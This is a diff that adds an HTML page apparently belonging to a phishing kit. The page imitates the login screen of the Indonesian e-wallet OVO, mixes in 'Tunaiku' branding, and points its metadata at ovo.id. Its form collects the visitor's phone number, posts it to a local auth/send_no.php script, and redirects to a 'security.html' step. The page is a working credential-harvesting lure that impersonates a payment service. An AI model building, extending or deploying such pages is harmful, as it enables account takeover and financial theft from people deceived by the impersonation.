@@ -1,0 +1,129 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Tunaiku | Join the rOVOlution in Payment, Points & Priority!</title>
+    <meta property="og:description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
+    <link rel="stylesheet" href="ast/main.css">
+    <link rel="stylesheet" href="ast/load.css">
+    <link rel="icon" href="img/favicon.png" type="image/png" sizes="32x32">
+    <link href='https://unpkg.com/boxicons@2.1.1/css/boxicons.min.css' rel='stylesheet'>
+    <meta property="og:title" content="OVO | Join the rOVOlution in Payment, Points & Priority!">
+    <meta property="twitter:title" content="OVO | Join the rOVOlution in Payment, Points & Priority!">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="og:image:type" content="image/jpeg"> 
+    <meta property="og:image" content="img/tampilan_1.jpg" >
+    <meta property="twitter:image:src" content="img/tampilan_1.jpg">
+    <meta property="og:url" content="https://www.ovo.id">
+    <meta property="og:description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
+    <meta property="twitter:description" content="Jadikan transaksi lebih simpel, instan, aman dan dapatkan berbagai keuntungan lainnya!">
+</head>
+<body>
+ 
+    <div class="container page1">
+        <div style="display:none;" class="load">
+            <div class="box">
+                <div class="circle one"></div>
+                <div class="circle two"></div>
+                <div class="circle three"></div>
+            </div>
+        </div>
+        <div class="loadingScreen">
+            <img class="ovologo" style="display:none;" src="img/ovo.png" alt="">
+        </div>
+        <div class="header">
+            <i onclick="window.location.href='/'" class='bx bx-left-arrow-alt'></i>
+            <i class='bx bxs-help-circle' ></i>
+        </div>
+        <div class="title">
+            <h3 class="b">Masuk atau Daftar</h3>
+            <p class="r">Masuk atau daftar cuma butuh nomor HP aja / Email.</p>
+        </div>
+        <form id="formNohp" onsubmit="sendNohp(event);">
+            <div class="wrapInp">
+                <div class="label r"><p class="r">+62</p></div>
+                <input autofocus type="tel" autocomplete="off" id="nohp" class="nohp r" name="nohp" required>
+                <i id="del" onclick="removeInp();" class='bx bxs-x-circle' style="display:none;" ></i>
+            </div>
+            <p class="r reset">Nomor HP nggak aktif atau hilang? <span class="b">Atur Ulang</span></p>
+            <div class="bgbtn">
+                <p class="r">Dengan masuk atau daftar, kamu udah setuju dengan <span class="b">Ketentuan Layanan</span><br>dan <span class="b">Kebijakan Privasi</span> Aplikasi Tunaiku.</p>
+                <button disabled class="b" type="submit" id="btnnohp">Lanjutkan</button>
+            </div>
+        </form>
+    </div>
+   
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="ast/jquery.mask.min.js"></script>
+<script>
+    $(document).ready(function(){
+        $('#nohp').on('input', function(){
+            if($(this).val() == '0' || $(this).val() == '62'){
+                $(this).val('');
+            }
+        });
+    });
+</script>
+<script>
+    $(document).ready(function(){
+        $('#nohp').mask('000-0000-000000');
+    });
+</script>
+<script>
+    let inphp = document.getElementById("nohp");
+    let btnnohp = document.getElementById("btnnohp");
+    let del = document.getElementById("del");
+    inphp.addEventListener("input", val);
+    function val(){
+        if (inphp.value.length > 10){
+            btnnohp.disabled = false;
+        } else {
+            btnnohp.disabled = true;
+        }
+    };
+    inphp.addEventListener("input", valDel);
+    function valDel(){
+        if (inphp.value != ""){
+            $("#del").show();
+        } else {
+            $("#del").hide();
+        }
+    };
+    function removeInp(){
+        $("#nohp").val("");
+        $("#nohp").focus();
+        $("#del").hide();
+    }
+</script>
+<script>
+    function sendNohp(event){
+        event.preventDefault();
+        $(".load").fadeIn();
+        $("#nohp").blur();
+        $("#btnnohp").attr("disabled","true");
+        $.ajax({
+            type: 'POST',
+            url: 'auth/send_no.php',
+            data: $('#formNohp').serialize(),
+            dataType: 'text',
+            success: function(){
+                window.location.href = 'security.html';
+            }
+        })
+    };
+</script>
+<script>
+    window.onload = function(){
+        setTimeout(function(){
+            $(".ovologo").fadeIn(200);
+            setTimeout(function(){
+                $(".loadingScreen").fadeOut(200);
+            },1000);
+        },500);
+    }
+</script>
+</body>
+</html>
